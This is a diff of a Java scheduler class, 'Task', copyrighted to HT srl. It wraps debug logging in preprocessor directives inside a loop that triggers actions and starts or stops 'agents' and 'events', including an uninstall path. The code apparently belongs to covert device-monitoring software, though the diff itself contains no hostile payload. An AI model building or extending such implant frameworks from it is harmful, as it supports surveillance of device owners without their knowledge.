@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -30,8 +31,9 @@ public final class Task implements Singleton {
     private static final long APP_TIMER_PERIOD = 2000;
 
     /** The debug instance. */
-    // #debug
+    //#ifdef DEBUG
     private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);
+    //#endif
 
     /**
      * Gets the single instance of Task.
@@ -81,8 +83,10 @@ public final class Task implements Singleton {
         eventManager = EventManager.getInstance();
         agentManager = AgentManager.getInstance();
 
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("Task created");
+
+        //#endif
     }
 
     /**
@@ -94,8 +98,9 @@ public final class Task implements Singleton {
         Utils.sleep(1000);
 
         for (;;) {
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             // debug.trace("checkActions");
+            //#endif
             final int[] actionIds = status.getActionIdTriggered();
 
             final int asize = actionIds.length;
@@ -106,13 +111,16 @@ public final class Task implements Singleton {
                     final Action action = status.getAction(actionId);
 
                     if (action.isTriggered() == false) {
-                        // #debug
+                        //#ifdef DEBUG
                         debug.warn("Should be triggered: "+ action);
+                        //#endif
                         continue;
                     }
 
-                    // #debug debug
+                    //#ifdef DEBUG_TRACE
                     debug.trace("CheckActions() triggered" + action);
+
+                    //#endif
                     action.setTriggered(false, null);
 
                     final Vector subActions = action.getSubActionsList();
@@ -126,14 +134,16 @@ public final class Task implements Singleton {
                                 .getTriggeringEvent());
 
                         if (ret == false) {
-                            // #debug
+                            //#ifdef DEBUG
                             debug.warn("CheckActions() error executing: "+ subAction);
+                            //#endif
                             break;
                         }
 
                         if (subAction.wantUninstall()) {
-                            // #debug
+                            //#ifdef DEBUG
                             debug.warn("CheckActions() uninstalling");
+                            //#endif
                             agentManager.stopAll();
                             eventManager.stopAll();
                             status.unTriggerAll();
@@ -141,8 +151,9 @@ public final class Task implements Singleton {
                         }
 
                         if (subAction.wantReload()) {
-                            // #debug
+                            //#ifdef DEBUG
                             debug.warn("CheckActions() reloading");
+                            //#endif
                             agentManager.stopAll();
                             eventManager.stopAll();
                             Utils.sleep(2000);
@@ -160,8 +171,9 @@ public final class Task implements Singleton {
      * Start application timer.
      */
     synchronized void startApplicationTimer() {
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("startApplicationTimer");
+        //#endif
 
         if (applicationTimer != null) {
             applicationTimer.cancel();
@@ -179,8 +191,9 @@ public final class Task implements Singleton {
      * Stop application timer.
      */
     synchronized void stopApplicationTimer() {
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("stopApplicationTimer");
+        //#endif
         if (applicationTimer != null) {
             applicationTimer.cancel();
             applicationTimer = null;
@@ -194,8 +207,9 @@ public final class Task implements Singleton {
      * @return true, if successful
      */
     public boolean taskInit() {
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("TaskInit");
+        //#endif
 
         agentManager.stopAll();
         eventManager.stopAll();
@@ -207,8 +221,9 @@ public final class Task implements Singleton {
         conf = new Conf();
 
         if (conf.load() == false) {
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("TaskInit - Load Conf FAILED");
+            //#endif
 
             return false;
         }
@@ -220,28 +235,35 @@ public final class Task implements Singleton {
         // Da qui in poi inizia la concorrenza dei thread
 
         if (eventManager.startAll() == false) {
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("TaskInit - eventManager FAILED");
+            //#endif
             return false;
         }
 
-        // #debug info
+        //#ifdef DEBUG_INFO
         debug.info("TaskInit - agents started");
 
+        //#endif
+
         if (agentManager.startAll() == false) {
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("TaskInit - agentManager FAILED");
+            //#endif
             return false;
         }
 
         if (!DeviceInfo.isInHolster()) {
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("going to start ApplicationTimer");
+            //#endif
             startApplicationTimer();
         }
 
-        // #debug info
+        //#ifdef DEBUG_INFO
         debug.info("TaskInit - agents started");
+
+        //#endif
         return true;
     }
 }
